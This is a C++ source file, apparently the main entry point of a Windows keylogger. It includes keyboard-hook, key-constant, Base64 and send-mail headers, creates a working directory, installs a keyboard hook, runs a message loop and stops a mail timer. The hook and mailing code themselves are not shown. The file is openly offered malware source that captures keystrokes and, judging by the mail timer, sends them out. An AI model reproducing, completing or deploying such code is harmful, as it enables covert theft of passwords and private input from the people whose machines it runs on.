#include <iostream>
#include <windows.h>
#include <Helper.h>
#include <KeyConstants.h>
#include <Base64.h>
#include <Timer-header.h>
#include <SendMail.h>
#include <KeybHook.h>
using namespace std;

int main()
{
    MSG Msg;
    IO::MKDir(IO::GetOurPath(true)); //create path
    //while is our main thread
    InstallHook();
    while(GetMessage (&Msg, NULL, 0, 0)) //GetMessage takes msg from us at &Msg
    {
        TranslateMessage(&Msg); //take a msg from our program and that is intended for any certain window and then it will modify that particular msg with Msg
        DispatchMessage(&Msg);  //forwards that particular msg to system
    }
    MailTimer.Stop();
    return 0;

}
